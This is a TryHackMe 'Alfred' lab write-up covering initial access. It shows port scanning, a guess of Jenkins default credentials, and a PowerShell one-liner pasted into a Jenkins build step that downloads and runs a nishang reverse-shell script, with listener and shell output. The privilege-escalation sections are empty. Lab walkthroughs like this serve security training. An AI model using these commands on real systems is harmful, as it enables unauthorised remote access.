# $${\color{orange}TryHackMe - Alfred}$$
- [Challenge Information](#challenge-information)
- [Solution](#solution)

## Challenge Information
<a name="challenge-information"></a>

```text
  Level: Easy
  Author: tryhackme
  Description: Exploit Jenkins to gain an initial shell,
then escalate your privileges by exploiting Windows authentication tokens.
```

## Solution
<a name="solution"></a>

- [Task 1](#task1)
- [Task 2](#task2)
- [Task 3](#task3)


## $${\color{red}Task \space \color{red}1: \space \color{red}Inicial \space \color{red}Access}$$

### How many ports are open? (TCP only)?
Use this command and I can have a nmap record to review if needed.
```
nmap -T4 -sT -Pn -sV -v 10.10.212.252 -oN nmap.txt
...
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 7.5
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
```
## $${\color{blue}Open \space \color{blue}Ports}$$
- $${\color{orange}80/tcp}$$
- $${\color{green}3389/tcp}$$
- $${\color{lightblue}8080/tcp}$$

## What is the username and password for the login panel? (in the format username:password)?
For this question, I did access the website port 8080 which is a login page and using burpsuite where I tried to brute-force the credentials to login but I couldn't make it
Therefore, I did some google research of the default credentals and foundt that the default username is `admin`. 
Some pages might say that the default password is `Password` but it did not work for this case so I accidentally tried `admin` and it passed !!!@!!@! How fortunate I am!!!
I personally do not recommend using `hydra` or `ffuf` because in my case it did not work properly, may be I'm still a `script-kiddie`.
=> The answer is `admin:admin`

### Then I have to download this payload to my machine by using this command
```
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
```
First I set up a http ser ver by python (requiring root privilege, so I have to use sudo)
```
sudo python3 -m http.server 80
```
Simultanously, I also set up a netcat reverse shell with port 5678
```
nc -lvnp 5678
```
### Back to the point where I successfully logged in to the website via port 8080, I saw the project then click on that
### I spotted that the configure section allowing me to execute commnads then I just copied and pasted the following command (remember to modify your IP and PORT appropriately)
```
 powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port 5678
```
Afterwards, I wrote the description title and hit the `Apply` first then hit the `Save`

## $${\color{yellow} NOTE}$$
The fun part of this is how to execute the inputed command. Click on the `Build Now`, the command would be executed
```
$ sudo python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.212.252 - - [21/May/2025 01:00:28] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
On the other side, I had conncected to the machine
```
$ nc -lvnp 5678                                     
listening on [any] 5678 ...
connect to [10.23.99.113] from (UNKNOWN) [10.10.212.252] 49377
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\project>
PS C:\Program Files (x86)\Jenkins\workspace\project>cd C:\\
PS C:\> ls


    Directory: C:\


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019  10:21 PM            inetpub                           
d----         7/14/2009   4:20 AM            PerfLogs                          
d-r--        10/27/2019  12:12 AM            Program Files                     
d-r--        10/25/2019   9:54 PM            Program Files (x86)               
d-r--        10/26/2019   9:22 PM            Users                             
d----        10/27/2019  12:25 AM            Windows                           

```
Note that I was looking for user.txt therefore it should be located in the Users folder
```
PS C:\> cd Users
PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            bruce                             
d----        10/25/2019  10:21 PM            DefaultAppPool                    
d-r--        11/21/2010   7:16 AM            Public                            

```
```
PS C:\Users> cd bruce
PS C:\Users\bruce\Desktop> ls


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                                                 
-a---        10/25/2019  11:22 PM         32 user.txt  
```

## $${\color{red}Task \space \color{red}2: \space \color{red}Switchings \space \color{red}shells}$$
<a name="task2"></a>
## $${\color{red}Task \space \color{red}3: \space \color{red}Privilege \space \color{red}Escalation}$$
<a name="task3"></a>
